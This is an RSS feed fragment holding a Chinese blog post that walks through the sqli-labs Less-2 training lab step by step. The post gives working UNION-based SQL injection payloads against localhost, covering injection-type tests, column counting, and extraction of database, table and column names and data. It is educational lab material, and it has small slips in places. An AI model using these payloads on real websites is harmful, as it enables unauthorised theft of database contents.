<dc:creator>JERRY_Z</dc:creator>
<og:description>图像处理的基础知识(5)——绘制图像(1) JERRY_Z. ~ 2020 / 10 / 5 转载请注明出处！&amp;amp;lt;3 一、绘制三原色混色图 二、邮票制作 三、制作音乐贺卡 四、附 交流方式</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/JERRY-Z-J-R/p/13772107.html</dc:identifier>
</item>
<item>
<title>sqli-labs第二关 详解 - junlebao</title>
<link>http://www.cnblogs.com/junlebao/p/13772108.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/junlebao/p/13772108.html</guid>
<description>&lt;p&gt;学会了第一关，时隔多天来到了第二关，怎么说了没有看wp就给做出来了。&lt;/p&gt;
&lt;p&gt;首先，我是自己先判断了下，这个是什么注入&lt;/p&gt;
&lt;p&gt;?id=1'　　不行&lt;/p&gt;
&lt;p&gt;?id=1' or '1'='1--+　　也不行&lt;/p&gt;
&lt;p&gt;然后又尝试了下&lt;/p&gt;
&lt;p&gt;?id=1 and 1=1　　页面显示正常&lt;/p&gt;
&lt;p&gt;?id=1 and 1=2　　页面又错误回显&lt;/p&gt;
&lt;p&gt;然后这就是数字注入了&lt;/p&gt;
&lt;p&gt;于是我们去查库，跟第一关的思路是一样的。然后就爆出了库。如果不懂的可以点这个链接。&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://www.cnblogs.com/junlebao/p/13758919.html&quot;&gt;https://www.cnblogs.com/junlebao/p/13758919.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; sql注入一般步骤：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第一步：通过特殊的数据库查询语句&lt;/p&gt;
&lt;p&gt;第二步：在数据库的错误返回中找到sql漏洞&lt;/p&gt;
&lt;p&gt;第三步:利用sql语句猜解管理人员信息并登录管理员后台&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;判断注入类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数字型注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. url为 http://127.0.0.1/sqli-labs/Less-2/?id=1'时，因为有一个多余的&quot;单引号&quot;使查询语句错误&lt;/p&gt;
&lt;p&gt;2. url为 http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1时，没有报错&lt;/p&gt;
&lt;p&gt;3. url为 http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2时，由于1=2不成立，也会报错&lt;/p&gt;
&lt;p&gt;满足这三个，基本上就是数字注入了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;字符型注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1. url为 http://127.0.0.1/sqli-labs/Less-2/?id=1'时，数据库认为id叫做1'。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合）&lt;/p&gt;
&lt;p&gt;2. url为 http://127.0.0.1/sqli-labs/Less-2/?id=1' and '1'='1 在'1'='1之后没有加上'是因为传参时输入的内容已经被' '包围。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后台查询列数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用order by试出数据库列数&lt;/p&gt;
&lt;p&gt;url为 http://127.0.0.1/sqli-labs/Less-2/?id=1' order by 数字 （如果试4时有错误，3时正确，那么列数为3）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;找显示位&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写&lt;/p&gt;
&lt;p&gt;url为 http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,3&lt;/p&gt;
&lt;p&gt;加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查库名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;联合查询：select database();&lt;/p&gt;
&lt;p&gt;下面是查看数据库的版本和数据库信息&lt;/p&gt;
&lt;p&gt;假如显示位是3，http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,version,database()&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查表名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;找到库名以后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,table_name from information_schema.tables where table_schema='库名' (如果库名是字符型，此处库名要转成十六进制)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;information_schema:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查列名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;找到表之后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,column_name from information_schema.columns where table_name='表名' (如果表名是字符型，此处库名要转成十六进制)&lt;/p&gt;
&lt;p&gt;如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查具体数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;找到列之后，使用http://127.0.0.1/sqli-labs/Less-2/?id=1' union select 1,2,group_concat(&quot;要查询的数据&quot;) from 表名&lt;/p&gt;
</description>
<pubDate>Mon, 05 Oct 2020 15:49:00 +0000</pubDate>
<dc:creator>junlebao</dc:creator>
<og:description>学会了第一关，时隔多天来到了第二关，怎么说了没有看wp就给做出来了。 首先，我是自己先判断了下，这个是什么注入 ?id=1&amp;#39; 不行 ?id=1&amp;#39; or &amp;#39;1&amp;#39;=&amp;#39</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/junlebao/p/13772108.html</dc:identifier>
</item>
</channel>
</rss>